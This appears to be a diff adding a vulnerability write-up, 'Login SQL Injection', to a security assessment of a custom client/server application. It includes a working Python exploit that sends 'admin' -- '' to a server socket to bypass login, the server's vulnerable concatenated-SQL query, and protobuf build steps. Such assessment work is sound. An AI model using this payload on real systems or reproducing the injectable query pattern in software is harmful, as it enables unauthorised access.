@@ -299,3 +299,90 @@ V06) Weak Passwords that Enable Brute Force Attacks
 				SetTimer(REQ_TIMEOUT_TIMER, 5000, NULL);
 				...
 			}
+
+V07) Login SQL Injection
+	Compromise Sequence
+		1. Send SQL injection message to server like below:
+			>>> import socket
+			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			>>> s.connect(('192.168.0.228', 50000))
+			>>> s.sendall(b'\x53\x42\x31\x54\x21\x00\x00\x00\xC7\x8C\x07\x3C\xE8\x03\x00\x00\x0A\x0B\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27\x12\x02\x30\x30')
+			\x0A : id
+			\x0B : id length
+			\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27 : admin' -- '
+			\x12 : password
+			\x02 : password length
+			\x30\x30 : 00
+		
+	Vulnerabilities
+		V07-1. The server doesn't check id/pw valition from client, so attacker can login with SQL injection.
+			CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+
+	Approach
+		1. Check the login source codes of the client and server. The client code validates ID/PW input, but the server does not.
+			<mydb.cpp>
+			int CMydb::find_user(string id, string passwd)
+			{
+				...
+				std::ostringstream stringStream;
+				stringStream << "SELECT * from user where account='";
+				stringStream << id;
+				stringStream << "' and passwd='";
+				stringStream << passwd;
+				stringStream << "';";
+				string strstr = stringStream.str();
+				char *sql = (char *)strstr.c_str();
+				...
+				if (sqlite3_prepare(db, sql, -1, &stmt, nullptr) == SQLITE_OK)
+				{
+					if (sqlite3_step(stmt) == SQLITE_ROW)
+					{
+						...
+					}
+				}
+				else
+				{
+					SQL_CHECK("Error");
+				}
+				rc = sqlite3_exec(db, "END", 0, 0, 0);
+				...
+			}
+		2. Make the protobuf message and code for ID/PW
+			2-1. make protobuf message
+				<protocolLogin.proto>
+				syntax = "proto3";
+
+				package protocol_msg;
+
+				message LoginMsg {
+					string user_id = 1;
+					string password = 2;
+				}
+			
+			2-2. build python module for message
+				$ sudo apt install protobuf-compiler
+				$ sudo pip install protobuf
+				$ protoc -I="./" --python_out="./" protocolLogin.proto
+			
+			2-3. make SQL injection code using protobuf
+				<login.py>
+				# -*- coding: utf-8 -*-
+				import protocolLogin_pb2
+				import sys
+				import socket
+
+				# login protobuf
+				login = protocolLogin_pb2.LoginMsg()
+				login.user_id = "admin' -- '"
+				login.password = "00"
+
+				msg = login.SerializeToString()
+
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.connect(('192.168.0.228', 50000))
+
+				header = b'\x53\x42\x31\x54\x21\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00'	# preamble + size + timestamp + msgtype
+				s.sendall(header + msg)
+			
+			2-4. send this message to server
+				$ python3 login.py
